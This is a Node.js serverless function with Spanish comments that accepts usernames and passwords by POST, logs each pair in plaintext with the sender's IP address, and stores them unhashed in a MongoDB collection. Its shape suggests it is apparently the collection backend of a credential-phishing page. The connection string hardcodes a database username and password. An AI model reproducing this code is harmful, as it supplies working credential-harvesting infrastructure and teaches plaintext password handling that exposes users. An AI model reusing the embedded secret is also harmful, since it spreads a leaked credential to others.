// functions/postFunction.js

const { MongoClient } = require('mongodb');

const uri = 'mongodb+srv://witooz123:Ds1wfuGUxaqGvdSW@datacluster.s71xtyr.mongodb.net/?retryWrites=true&w=majority';

exports.handler = async function (event, context) {
  try {
    const { user, passwd } = JSON.parse(event.body);
    connectLog(event, user, passwd);

    // Conectar a la base de datos
    const client = new MongoClient(uri);
    await client.connect();

    // Seleccionar la base de datos y la colección
    const database = client.db('UserInfo');
    const collection = database.collection('user');

    // Insertar el mensaje en la colección
    await collection.insertOne({ user, passwd });

    // Desconectar del servidor de base de datos
    await client.close();

    return {
      statusCode: 201,
      body: JSON.stringify({ message: 'Solicitud POST recibida correctamente' }),
    };
  } catch (error) {
    console.error('Error al manejar la solicitud POST:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Error interno del servidor' }),
    };
  }
};

function connectLog(event, user, passwd) {
  const userIp = event.headers['client-ip'] || event.headers['x-real-ip'] || event.headers['x-forwarded-for'] || event.ip || 'Unknown';
  const userUrl = event.path;

  console.log(`New connection -> IP: ${userIp} | Url: ${userUrl} | Data Received: Username -> ${user}, Password -> ${passwd}`);
}
